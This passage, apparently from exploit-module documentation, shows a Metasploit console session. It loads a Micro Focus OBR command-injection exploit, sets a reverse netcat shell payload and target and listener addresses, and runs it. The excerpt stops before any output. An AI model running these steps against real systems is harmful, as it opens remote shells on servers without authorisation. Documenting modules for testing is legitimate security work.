## Scenarios

```
msf6 > use exploit/linux/http/microfocus_obr_cmd_injection
msf6 exploit(linux/http/microfocus_obr_cmd_injection) > set payload payload/cmd/unix/reverse_netcat
payload => cmd/unix/reverse_netcat
msf6 exploit(linux/http/microfocus_obr_cmd_injection) > set rhost 10.0.0.10
rhost => 10.0.0.10
msf6 exploit(linux/http/microfocus_obr_cmd_injection) > set lhost 10.0.0.1
lhost => 10.0.0.1
msf6 exploit(linux/http/microfocus_obr_cmd_injection) > run
